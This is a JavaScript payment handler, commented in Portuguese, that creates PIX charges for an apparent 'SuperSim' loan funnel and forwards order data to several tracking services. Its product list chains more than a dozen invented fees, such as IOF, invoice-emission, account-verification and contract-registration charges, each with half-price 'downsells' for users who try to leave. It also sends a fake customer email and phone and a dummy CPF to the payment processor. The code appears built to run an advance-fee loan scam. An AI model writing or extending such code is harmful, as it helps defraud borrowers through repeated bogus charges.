const PRODUCTS = {
  seguro: { price: 19.48, name: "Seguro Prestamista - SuperSim" },
  seguro_plus: { price: 29.90, name: "Seguro Prestamista - SuperSim (Completo)" },
  seguro_max:  { price: 44.90, name: "Seguro Prestamista - SuperSim (Premium)" },

  // ── UPSELLS NOVOS (cadeia B, modelada na referência) ──
  n_conta:    { price: 26.81, name: "Taxa de Verificação de Conta" },
  n_tenf:     { price: 19.90, name: "TENF - Taxa de Emissão de Nota Fiscal" },
  n_titular:  { price: 26.41, name: "Verificação de Titularidade" },
  n_iof:      { price: 23.44, name: "IOF - Imposto sobre Operações Financeiras" },
  n_cashback: { price: 17.00, name: "Ativação do Cashback SuperSim" },
  n_proc:     { price: 29.90, name: "Taxa de Processamento Administrativo" },
  // downsell dos novos (50% OFF)
  n_conta_ds:    { price: 13.40, name: "Taxa de Verificação de Conta" },
  n_tenf_ds:     { price: 9.95,  name: "TENF - Taxa de Emissão de Nota Fiscal" },
  n_titular_ds:  { price: 13.20, name: "Verificação de Titularidade" },
  n_iof_ds:      { price: 11.72, name: "IOF - Imposto sobre Operações Financeiras" },
  n_cashback_ds: { price: 8.50,  name: "Ativação do Cashback SuperSim" },
  n_proc_ds:     { price: 14.95, name: "Taxa de Processamento Administrativo" },

  up1:  { price: 24.82, name: "IOF - Imposto sobre Operações Financeiras" },
  up2:  { price: 23.91, name: "Taxa de Verificação de IOF" },
  up3:  { price: 18.68, name: "Seguro Prestamista - Tarifa de Cadastro" },
  up4:  { price: 17.20, name: "TENF - Taxa de Emissão da Nota Fiscal" },
  up5:  { price: 17.00, name: "Ativar Conta" },
  up6:  { price: 17.02, name: "Taxa de Registro do Contrato" },
  up7:  { price: 14.06, name: "Taxa - Limite Adicional de R$20.000" },
  up8:  { price: 14.06, name: "Taxa de Processamento" },
  up9:  { price: 11.99, name: "Aplicativo SuperSim" },
  up10: { price: 16.92, name: "TAC - Taxa de Abertura de Crédito" },
  up11: { price: 19.53, name: "Taxa de Consultoria Financeira" },
  up12: { price: 31.92, name: "Taxa de Processamento Administrativo" },

  // ── DOWNSELL (50% OFF) — recuperação ao tentar voltar ──
  seguro_ds: { price: 9.74, name: "Seguro Prestamista - SuperSim (desconto)" },
  up1_ds:  { price: 12.41, name: "IOF - Imposto sobre Operações Financeiras (desconto)" },
  up2_ds:  { price: 11.96, name: "Taxa de Verificação de IOF (desconto)" },
  up3_ds:  { price: 9.34,  name: "Seguro Prestamista - Tarifa de Cadastro (desconto)" },
  up4_ds:  { price: 8.60,  name: "TENF - Taxa de Emissão da Nota Fiscal (desconto)" },
  up5_ds:  { price: 8.50,  name: "Ativar Conta (desconto)" },
  up6_ds:  { price: 8.50,  name: "Taxa de Registro do Contrato (desconto)" },
  up7_ds:  { price: 7.03,  name: "Taxa - Limite Adicional de R$20.000 (desconto)" },
  up8_ds:  { price: 7.03,  name: "Taxa de Processamento (desconto)" },
  up9_ds:  { price: 6.00,  name: "Aplicativo SuperSim (desconto)" },
  up10_ds: { price: 8.46,  name: "TAC - Taxa de Abertura de Crédito (desconto)" },
  up11_ds: { price: 9.77,  name: "Taxa de Consultoria Financeira (desconto)" },
  up12_ds: { price: 15.96, name: "Taxa de Processamento Administrativo (desconto)" },
};

// Order bumps do checkout novo — preço fica NO SERVIDOR (o front só manda a chave).
const BUMPS = {
  bump_cartao:  { price: 19.00, name: "Cartão de Crédito SuperSim" },
  bump_credito: { price: 22.00, name: "Aumento de Crédito +R$ 5.000" },
  bump_suporte: { price:  9.00, name: "Suporte Exclusivo 24h" },
};

import { sha256hex } from "./_crypto.js";
import { enviarFurys } from "./_furys.js";
import { enviarTrackou } from "./_trackou.js";
import { enviarEventoMeta, ehFront, geoDoRequest } from "./_meta.js";
import { aposResponder } from "./_apos.js";
// pixel: ver PIXELS em _meta.js (16/10)

// Limpa BOM/caracteres invisíveis de chaves vindas da Vercel (evita ByteString error)
function cleanKey(v) { return (v || "").replace(/[^\x20-\x7E]/g, "").trim(); }
// fetch com timeout — evita a função ficar presa se a API externa (SkalePay) travar
function fetchT(url, opts, ms) {
  const c = new AbortController();
  const t = setTimeout(() => c.abort(), ms);
  return fetch(url, Object.assign({}, opts, { signal: c.signal })).finally(() => clearTimeout(t));
}
function sha256(str) { return sha256hex((str || "").toLowerCase().trim()); }
// Telefone no padrão Meta: só dígitos, com DDI 55 na frente
function normalizePhoneBR(p) { let d = (p || "").replace(/\D/g, ""); if (!d) return ""; if (d.length <= 11 && !d.startsWith("55")) d = "55" + d; return d; }

// CAPI genérica — usada para InitiateCheckout e Lead (Purchase fica SÓ no webhook).
// Advanced Matching MAXIMIZADO: email + telefone(55) + nome + sobrenome + cpf + ip + ua + fbp + fbc.
function buildExternalId(cpf, eid) {
  const ext = [];
  if (cpf) ext.push(sha256(cpf.replace(/\D/g, "")));
  if (eid) ext.push(sha256(eid));
  return ext;
}

// (CAPI da Meta agora vive em ./_meta.js — front-only, v26, geo + event_source_url)

// Ordem REAL da cadeia de upsells (espelha js/upsells-shared.js).
// Fluxo: front -> up1 -> up4 -> up5 -> up6 -> up7 -> up9 -> up10 -> up11 -> up12 -> up8 -> up2 -> up3
// O que aparece na NOTIFICAÇÃO é a POSIÇÃO na sequência (UP1, UP2, ...),
// não o número da pasta. Ex.: o 2º upsell é a pasta up4, mas na notificação cai como "UP2".
// Isso NÃO muda pastas, upKey, preços nem navegação — só o rótulo enviado à UTMify.
const UPSELL_ORDER = [1, 4, 5, 6, 7, 9, 10, 11, 12, 8, 2, 3];

function sequenceLabel(upKey) {
  const isDs = /_ds$/.test(upKey || "");
  const base = (upKey || "").replace(/_ds$/, "");
  let label;
  if (base === "seguro" || base === "seguro_plus" || base === "seguro_max") {
    label = "FRONT";
  } else {
    const folderNum = parseInt(base.replace(/^up/, ""), 10);
    const pos = UPSELL_ORDER.indexOf(folderNum);
    label = pos >= 0 ? "UP" + (pos + 1) : base.toUpperCase();
  }
  return isDs ? label + " (downsell)" : label;
}

function utmsFromReferer(referer) {
  try {
    const p = new URL(referer).searchParams;
    return {
      src:          p.get("src")          || null,
      sck:          p.get("sck")          || null,
      utm_source:   p.get("utm_source")   || null,
      utm_medium:   p.get("utm_medium")   || null,
      utm_campaign: p.get("utm_campaign") || null,
      utm_term:     p.get("utm_term")     || null,
      utm_content:  p.get("utm_content")  || null,
    };
  } catch { return {}; }
}

function mergeUtms(frontend, fallback) {
  return {
    src:          (frontend && frontend.src)          || fallback.src          || null,
    sck:          (frontend && frontend.sck)          || fallback.sck          || null,
    utm_source:   (frontend && frontend.utm_source)   || fallback.utm_source   || null,
    utm_medium:   (frontend && frontend.utm_medium)   || fallback.utm_medium   || null,
    utm_campaign: (frontend && frontend.utm_campaign) || fallback.utm_campaign || null,
    utm_term:     (frontend && frontend.utm_term)     || fallback.utm_term     || null,
    utm_content:  (frontend && frontend.utm_content)  || fallback.utm_content  || null,
  };
}

async function sendUtmifyOrder({ orderId, status, amount, utms, nome, upKey, productName }) {
  const token = cleanKey(process.env.UTMIFY_API_TOKEN);
  if (!token) return;

  const priceInCents = Math.round(Number(amount) * 100);
  const payload = {
    orderId: String(orderId),
    platform: "other",
    status,
    paymentMethod: "pix",
    amount: Number(amount),
    createdAt: new Date().toISOString(),
    approvedDate: status === "paid" ? new Date().toISOString() : null,
    commission: {
      totalPriceInCents:     priceInCents,
      gatewayFeeInCents:     0,
      userValueInCents:      priceInCents,
      userCommissionInCents: priceInCents,
    },
    customer: { name: nome || "Cliente", email: "cliente@supersim.com.br", phone: null, document: null },
    products: [{ id: upKey, name: productName, planId: null, planName: null, quantity: 1, priceInCents }],
    trackingParameters: {
      src:          (utms && utms.src)          || null,
      sck:          (utms && utms.sck)          || null,
      utm_source:   (utms && utms.utm_source)   || null,
      utm_medium:   (utms && utms.utm_medium)   || null,
      utm_campaign: (utms && utms.utm_campaign) || null,
      utm_term:     (utms && utms.utm_term)     || null,
      utm_content:  (utms && utms.utm_content)  || null,
    },
  };

  const utmsPresent = Object.values(payload.trackingParameters).some(v => v);
  try {
    const r = await fetch("https://api.utmify.com.br/api-credentials/orders", {
      method: "POST",
      headers: { "Content-Type": "application/json", "x-api-token": token },
      body: JSON.stringify(payload),
    });
    const body = await r.text().catch(() => "");
    console.log("[utmify]", status, "upKey", upKey, "order", String(orderId), "http", r.status, "utms?", utmsPresent, body.slice(0, 300));
  } catch (err) {
    console.error("[utmify] falha:", err.message);
  }
}

export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") return res.status(200).end();
  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

  const { upKey, nome, cpf, email, phone, eid, utms, fbp, fbc, icEventId, leadEventId, bumps } = req.body || {};

  const product = PRODUCTS[upKey];
  if (!product) return res.status(400).json({ error: "Produto inválido" });

  // Order bumps (checkout novo): soma os selecionados, todos com preço do servidor.
  const bumpKeys = Array.isArray(bumps) ? bumps.filter((k) => BUMPS[k]) : [];
  const bumpItems = bumpKeys.map((k) => ({
    title: BUMPS[k].name,
    unitPrice: Math.round(BUMPS[k].price * 100),
    quantity: 1,
    tangible: false,
  }));
  const bumpTotal = bumpItems.reduce((s, it) => s + it.unitPrice, 0);

  const amount = Math.round(product.price * 100) + bumpTotal;

  // Cloudflare Workers (18/10): o BASE_URL vem dos secrets do worker. O fallback
  // antigo era `https://${VERCEL_URL}` — variável que NÃO EXISTE na Cloudflare, então
  // worker novo subido sem o secret (já aconteceu em 16/10: dois secrets foram ao ar
  // vazios) gravava postbackUrl "https://undefined/api/webhook": a SkalePay nunca
  // avisava o pagamento e a venda ficava pendente PARA SEMPRE, sem erro na tela.
  // Hoje cai no host da PRÓPRIA requisição, que no Worker já é o domínio público do funil.
  const baseUrl = cleanKey(process.env.BASE_URL).replace(/\/+$/, "")
    || (req.headers.host ? `https://${cleanKey(req.headers.host)}` : "");
  if (!baseUrl) console.error("[pix] BASE_URL ausente e requisição sem host — postback sem destino");
  const postbackUrl = `${baseUrl}/api/webhook`;

  const referer = req.headers["referer"] || "";
  const mergedUtms = mergeUtms(utms, utmsFromReferer(referer));

  const ip = req.headers["x-forwarded-for"]?.split(",")[0]?.trim() || req.socket?.remoteAddress || null;
  const ua = req.headers["user-agent"] || null;

  const cpfClean = (cpf || "").replace(/\D/g, "").slice(0, 11).padEnd(11, "0");
  // CPF inválido (todos zeros ou vazio) → usa CPF dummy válido
  const cpfFinal = /^0+$/.test(cpfClean) || cpfClean.length < 11 ? "11144477735" : cpfClean;

  const payload = {
    amount,
    paymentMethod: "pix",
    pix: { expiresInDays: 1 },
    customer: {
      name: nome || "Cliente",
      email: "cliente@supersim.com.br",
      phone: "11999999999",
      document: { number: cpfFinal, type: "cpf" },
    },
    items: [
      { title: product.name, unitPrice: Math.round(product.price * 100), quantity: 1, tangible: false },
      ...bumpItems,
    ],
    metadata: {
      upKey,
      priceReais: amount / 100,
      bumps: bumpKeys,
      productName: (sequenceLabel(upKey) + " - " + product.name + (bumpKeys.length ? " + " + bumpKeys.length + " extra(s)" : "")),
      nome: nome || "",
      cpf: cpfFinal,
      email: email || "",
      phone: phone || "",
      eid: eid || "",
      utms: mergedUtms,
      fbp: fbp || null,
      fbc: fbc || null,
      ip,
      ua,
      sourceUrl: referer || null,
      geo: geoDoRequest(req),
    },
    postbackUrl,
  };

  try {
    const resp = await fetchT("https://api.skalepayments.com.br/transactions", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-API-Key": cleanKey(process.env.SKALE_API_KEY),
      },
      body: JSON.stringify(payload),
    }, 8000);

    const data = await resp.json();

    if (!data.success) {
      console.error("[pix] SkalePay error:", JSON.stringify(data));
      return res.status(500).json({ error: "Falha ao criar transação" });
    }

    // Notifica UTMify (waiting_payment) + CAPI InitiateCheckout + Lead, EM PARALELO.
    // Promise.allSettled garante que as 3 terminam antes do Vercel encerrar a função,
    // sem que uma atrase a outra (o QR já está pronto). Purchase NUNCA aqui — só no webhook.
    const amountReais = amount / 100;   // total: produto + order bumps
    const _tracking = Promise.allSettled([
      sendUtmifyOrder({
        orderId: data.id,
        status: "waiting_payment",
        amount: amountReais,
        utms: mergedUtms,
        nome: nome || "",
        upKey,
        productName: (sequenceLabel(upKey) + " - " + product.name + (bumpKeys.length ? " + " + bumpKeys.length + " extra(s)" : "")),
      }),
      // Meta CAPI: SÓ no front (upsell/downsell nunca mandam evento — trava dentro do _meta.js)
      ...(ehFront(upKey) ? [
        enviarEventoMeta({ eventName: "InitiateCheckout", eventId: icEventId, sourceUrl: referer, upKey, valor: amountReais,
          produto: product.name, user: { nome, cpf: cpfFinal, email, phone, eid, fbp, fbc, ip, ua, geo: geoDoRequest(req) } }),
        enviarEventoMeta({ eventName: "Lead", eventId: leadEventId, sourceUrl: referer, upKey, valor: amountReais,
          produto: product.name, user: { nome, cpf: cpfFinal, email, phone, eid, fbp, fbc, ip, ua, geo: geoDoRequest(req) } }),
      ] : []),
      /* A venda PENDENTE na dashboard própria. Entra junto dos outros dois
         porque, como eles, não pode atrasar a entrega do QR Code — e como
         eles, falhar aqui não pode derrubar a venda. O mesmo `data.id` volta
         no webhook como `approved`, e é isso que faz a linha TRANSITAR em vez
         de duplicar. */
      enviarFurys({
        transactionId: data.id,
        status: "waiting_payment",
        amount: amountReais,
        produto: (sequenceLabel(upKey) + " - " + product.name + (bumpKeys.length ? " + " + bumpKeys.length + " extra(s)" : "")),
        nome, email, phone, eid,
        utms: mergedUtms,
      }),
      /* Trackou (nova, 30/09) — pendente também, com o MESMO `data.id` que
         o webhook usa depois pra transicionar pra "paid" (nunca duplica). */
      enviarTrackou({
        transactionId: data.id,
        status: "waiting_payment",
        amount: amountReais,
        produto: (sequenceLabel(upKey) + " - " + product.name + (bumpKeys.length ? " + " + bumpKeys.length + " extra(s)" : "")),
        nome, email, phone,
        utms: mergedUtms,
        fbp, fbc, ip, ua, eid,
      }),
    ]);
    // Agenda o rastreio para continuar DEPOIS da resposta (Cloudflare e Vercel).
    const agendado = aposResponder(_tracking);
    // Teto: devolve o QR sem ficar preso se UTMify/Meta travar.
    // ⛔ Se NINGUÉM vai segurar o processo depois da resposta (agendado=false),
    // esperar 1,5s e responder PERDE o que ainda está voando — a venda sai na
    // SkalePay e não chega na dash. Nesse caso a espera sobe para 4,5s: atrasa
    // o QR no pior caso, nunca perde a venda.
    const teto = agendado ? 1500 : 4500;
    await Promise.race([_tracking, new Promise(function (r) { setTimeout(r, teto); })]);

    return res.json({
      success: true,
      txnId: data.id,
      qrcode: data.pix.qrcode,
      amount: amountReais,
    });
  } catch (err) {
    console.error("[pix] exception:", err.message);
    return res.status(500).json({ error: "Erro interno" });
  }
};
